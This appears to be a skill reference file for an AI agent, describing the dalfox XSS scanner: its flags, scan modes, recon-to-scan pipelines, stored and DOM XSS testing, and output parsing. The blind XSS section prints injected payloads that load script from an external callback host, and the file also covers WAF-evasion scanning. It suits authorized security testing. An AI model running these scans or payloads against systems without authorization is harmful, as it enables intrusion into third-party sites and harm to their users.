---
name: dalfox
description: "Auth/lab ref: fast Go-based XSS scanner for parameter analysis and DOM-based XSS detection."
license: MIT
compatibility: "Linux / macOS / Windows."
metadata:
  author: AeonDave
  version: "1.1"
---

# dalfox

Fast XSS scanner — parameter analysis, DOM detection, blind XSS.

## Quick Start

```bash
# Scan single URL
dalfox url "http://target.com/search?q=test"

# Scan from file
dalfox file urls.txt

# Pipe from other tools
cat urls.txt | dalfox pipe
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `--cookie <str>` | Cookie string for authenticated scans |
| `--header <str>` | Custom HTTP header |
| `--data <str>` | POST body data |
| `--method <GET\|POST>` | HTTP method |
| `--blind <url>` | Blind XSS callback URL |
| `--custom-payload <file>` | Custom XSS payloads file |
| `--custom-alert-value <str>` | Custom alert value to confirm XSS |
| `--only-custom-payload` | Use only custom payloads |
| `--skip-bav` | Skip BAV (Basic Additional Verify) |
| `--skip-grep` | Skip Grep (response analysis) |
| `--skip-mining-dom` | Skip DOM-based mining |
| `--skip-mining-dict` | Skip parameter dictionary mining |
| `--mining-dict-word <file>` | Custom parameter mining wordlist |
| `--follow-redirects` | Follow HTTP redirects |
| `--proxy <url>` | HTTP proxy |
| `--timeout <n>` | Request timeout (default 10s) |
| `--delay <n>` | Delay between requests (ms) |
| `--worker <n>` | Concurrent workers (default 100) |
| `--waf-evasion` | Slow down + mutate payloads when WAF detected |
| `--skip-bav` | Skip Basic Another Vulnerability checks (SQLi, SSTI, redirect) |
| `--skip-mining-all` | Disable all parameter mining |
| `--only-discovery` | Run parameter discovery only, skip XSS testing |
| `--skip-discovery` | Skip discovery, go straight to XSS testing |
| `--ignore-param <p>` | Skip specific parameter |
| `--force-headless-verification` | Force headless browser to verify all findings |
| `--skip-headless` | Skip headless browser (faster, misses DOM XSS) |
| `--remote-payloads <src>` | Load remote payloads: `portswigger,payloadbox` |
| `--remote-wordlists <src>` | Remote wordlists for mining: `burp,assetnote` |
| `--custom-alert-type <types>` | Test `str,int` alert types |
| `--poc-type <type>` | PoC format: `plain,curl,httpie,http-request` |
| `--output-request` | Include raw HTTP requests in output |
| `--output-response` | Include raw HTTP responses in output |
| `--found-action <cmd>` | Shell command on each finding (`$POCURL` = PoC URL) |
| `--config <file>` | Load settings from JSON config file |
| `--har-file-path <path>` | Save HAR of findings |
| `-o <file>` | Output file |
| `--output-all` | Include all events in output |
| `--format <fmt>` | plain / json |
| `--ignore-return <codes>` | Ignore specific HTTP status codes |
| `--no-color` | Disable color output |
| `-S` / `--silence` | Silent mode (findings only) |
| `--report` | Generate report |
| `--report-format <fmt>` | plain / json |
| `-v` | Verbose |

## Modes

| Mode | Command | Use |
|------|---------|-----|
| Single URL | `dalfox url "<url>"` | Test one target |
| File | `dalfox file urls.txt` | Bulk scan |
| Pipe | `echo url \| dalfox pipe` | Pipeline integration |
| Server | `dalfox server` | API server mode |
| Sxss | `dalfox sxss` | Stored XSS via two URLs |
| Payload | `dalfox payload` | Generate/show payloads |

## Common Workflows

```bash
# Authenticated scan with cookie
dalfox url "http://target.com/search?q=test" \
    --cookie "session=abc123; user=admin"

# POST parameter scan
dalfox url "http://target.com/comment" \
    --data "content=test&id=1" \
    --method POST

# Blind XSS with custom callback
dalfox url "http://target.com/search?q=test" \
    --blind "https://your-xss-hunter.com/callback"

# Silent mode for clean output
dalfox file urls.txt -S --format json -o xss_findings.json

# Through proxy (Burp)
dalfox url "http://target.com/search?q=test" \
    --proxy "http://127.0.0.1:8080"

# Custom headers (JWT auth)
dalfox url "http://target.com/api?q=test" \
    --header "Authorization: Bearer eyJhbGc..."

# Skip DOM and dict mining (speed up)
dalfox file urls.txt \
    --skip-mining-dom --skip-mining-dict \
    --worker 50 -S

# With custom payloads
dalfox url "http://target.com/search?q=test" \
    --custom-payload payloads.txt \
    --only-custom-payload
```

## Pipeline Integration

```bash
# Full recon → XSS pipeline with gf xss filter:
subfinder -d target.com -silent | \
    httpx -silent | \
    waybackurls | \
    sort -u | \
    gf xss | \
    dalfox pipe \
        -b "https://your.xsshunter.com/script.js" \
        --worker 30 --delay 100 \
        --waf-evasion \
        --format json -o xss_results.json

# gau → filter reflective parameters → dalfox:
gau target.com | \
    grep "=" | \
    qsreplace "FUZZ" | \
    dalfox pipe --custom-alert-value "FUZZ" -S

# Katana crawl → dalfox:
katana -u https://target.com -silent -jc | \
    grep "=" | \
    dalfox pipe -S

# Waybackurls → dalfox (historical URLs):
waybackurls target.com | \
    grep "=" | \
    uro | \
    dalfox pipe -S --worker 30
```

> `gf xss` from [tomnomnom/gf](https://github.com/tomnomnom/gf) + [1ndianl33t/gf-patterns](https://github.com/1ndianl33t/gf-patterns) filters for historically XSS-prone params: `q`, `s`, `search`, `query`, `url`, `redirect`, `next`, `ref`, `callback`, etc.

## Blind XSS Setup

```bash
# Use xsshunter.com OR self-hosted interactsh:
# Step 1: Get callback URL (xsshunter / interactsh / canarytokens)
BLIND_URL="https://xsshunter.com/your-unique-id"

# Step 2: Run with --blind
dalfox url "http://target.com/feedback?msg=test" \
    --blind "$BLIND_URL"

# dalfox injects payloads that load from blind URL:
# <script src="$BLIND_URL"></script>
# "><img src=x onerror="import('$BLIND_URL')">
# Trigger detected when callback URL is fetched

# With interactsh client:
interactsh-client &
IHOST=$(interactsh-client -server interactsh.com -token $TOKEN -v 2>&1 | grep "Listing" | awk '{print $NF}')
dalfox url "http://target.com/search?q=test" --blind "http://$IHOST"
```

## DOM XSS

```bash
# DOM mining enabled by default
dalfox url "http://target.com/app" --cookie "session=abc"

# Deep DOM analysis (headless browser, slow but thorough)
dalfox url "http://target.com/app" --deep-domxss

# Skip headless for speed (fast triage, misses some DOM XSS)
dalfox url "http://target.com/app" --skip-headless

# Force headless verification for all findings
dalfox url "http://target.com/app" --force-headless-verification

# What dalfox tracks as sinks:
# - document.write / document.writeln
# - innerHTML / outerHTML / insertAdjacentHTML
# - eval() / setTimeout(str) / setInterval(str)
# - location.href / location.hash / location.assign()
# - jQuery .html() / .append() / .load()
```

## Stored XSS Mode

```bash
# Inject at one URL, verify at another
dalfox sxss "https://target.com/comment/submit" \
    -d "author=test&body=test" \
    -C "session=abc123" \
    --trigger "https://target.com/comments/view"

# Paginated/ID-based trigger URL (SEQNC = incrementing number)
dalfox sxss "https://target.com/post" \
    -d "content=test" \
    --trigger "https://target.com/post/view?id=SEQNC" \
    --sequence 5

# With notification on find
dalfox sxss "https://target.com/profile/edit" \
    -d "bio=test" -C "session=abc123" \
    --trigger "https://target.com/profile/view" \
    --found-action 'echo "STORED XSS: $POCURL" >> findings.txt'
```

## Automation with --found-action

```bash
# $POCURL env var = PoC URL for the finding
# Run any shell command when XSS is found

# Slack notification
dalfox url "https://target.com/?q=test" \
    --found-action 'curl -s -X POST \
    -H "Content-Type: application/json" \
    -d "{\"text\":\"XSS found: $POCURL\"}" \
    https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK'

# Log with curl PoC
dalfox file urls.txt \
    --poc-type curl \
    --found-action 'echo "$POCURL" >> xss_findings.txt'
```

## Config File

```json
{
  "worker": 30,
  "delay": 200,
  "blind": "https://your.xsshunter.com/script.js",
  "cookie": "session=abc123",
  "format": "json",
  "poc-type": "curl",
  "waf-evasion": true,
  "output": "scan_results.json"
}
```

```bash
dalfox url "https://target.com/" --config config.json
# CLI flags override config file values
```

## Output Parsing

```bash
# JSON output:
dalfox file urls.txt -S --format json -o results.json

# Parse findings:
cat results.json | jq '.[] | select(.type == "G") | {url: .data, param: .param, payload: .payload}'

# Types:
# G = Generic (verified XSS)
# B = Blind XSS sent
# R = Reflected (not confirmed)

# Count findings:
cat results.json | jq '[.[] | select(.type == "G")] | length'
```

## Resources

| File | When to load |
|------|--------------|
| `references/xss-payloads.md` | Payload bypass techniques, WAF evasion, context-specific payloads |
